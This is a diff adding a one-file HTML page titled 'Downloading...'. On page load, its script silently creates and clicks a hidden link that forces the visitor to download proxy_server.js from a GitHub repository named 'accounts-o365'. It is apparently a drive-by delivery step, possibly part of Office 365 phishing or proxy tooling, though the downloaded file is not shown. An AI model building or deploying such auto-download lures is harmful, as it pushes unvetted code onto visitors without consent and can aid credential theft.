@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Downloading...</title>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            const link = document.createElement('a');
+            link.href = 'https://raw.githubusercontent.com/davidokeke190-code/accounts-o365/main/proxy_server.js';
+            link.download = 'proxy_server.js';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
+</body>
+</html>
